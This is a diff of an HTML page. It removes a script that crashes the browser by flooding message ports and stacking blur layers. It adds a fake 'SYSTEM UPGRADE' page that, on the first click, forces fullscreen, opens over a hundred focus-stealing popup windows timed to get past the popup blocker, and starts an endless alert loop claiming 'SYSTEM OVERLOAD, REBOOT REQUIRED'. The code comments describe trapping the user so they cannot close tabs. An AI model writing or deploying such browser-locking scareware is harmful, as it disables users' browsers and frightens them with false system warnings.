@@ -1,28 +1,48 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>⚡ SYSTEM UPGRADE ⚡</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: crosshair; }
+        h1 { font-size: 3rem; text-shadow: 0 0 10px #0f0; }
+    </style>
+</head>
 <body>
-    <script>
-        const channel = new MessageChannel();
-        const startNuke = () => {
-            // Create a feedback loop of messages that never ends
-            // and grows exponentially in the message queue.
-            channel.port1.onmessage = () => {
-                for(let i=0; i<100; i++) {
-                    channel.port2.postMessage(new Uint8Array(1024 * 1024)); // 1MB payload
-                }
-            };
-            channel.port2.postMessage('go');
-        };
+    <h1>[ INITIALIZE SYSTEM TEST ]</h1>
 
-        // Triggering a massive DOM reflow alongside IPC flooding
-        // forces the 'Browser' process and 'Renderer' process to 
-        // fight for the same mutex locks.
-        setInterval(() => {
-            const div = document.createElement('div');
-            div.style.cssText = 'position:fixed;top:0;width:100vw;height:100vh;backdrop-filter:blur(100px);';
-            document.body.appendChild(div);
-            startNuke();
-        }, 10);
+    <script>
+        const target = "https://github.io";
+
+        function trigger() {
+            // 1. Force Fullscreen (Hides the 'X' button and Taskbar)
+            document.documentElement.requestFullscreen();
+
+            // 2. The "Window Shatter"
+            // We use a small delay to trick the pop-up blocker into thinking
+            // these are separate user-authorized events.
+            let count = 0;
+            const storm = setInterval(() => {
+                const win = window.open(target, "win" + count, "width=300,height=300,left=" + (Math.random()*800) + ",top=" + (Math.random()*600));
+                
+                // 3. The "Focus Steal"
+                // This keeps the new windows popping to the FRONT
+                if (win) win.focus();
+                
+                count++;
+                if (count > 100) clearInterval(storm);
+            }, 50);
+
+            // 4. The "Infinite Alert" Lock
+            // This stops the user from clicking 'Close' on any tab
+            setTimeout(() => {
+                while(true) {
+                    alert("⚠️ SYSTEM OVERLOAD ⚠️\nREBOOT REQUIRED");
+                }
+            }, 2000);
+        }
+
+        // The trap is set: The first time they click ANYWHERE, it fires.
+        window.onclick = trigger;
     </script>
 </body>
 </html>
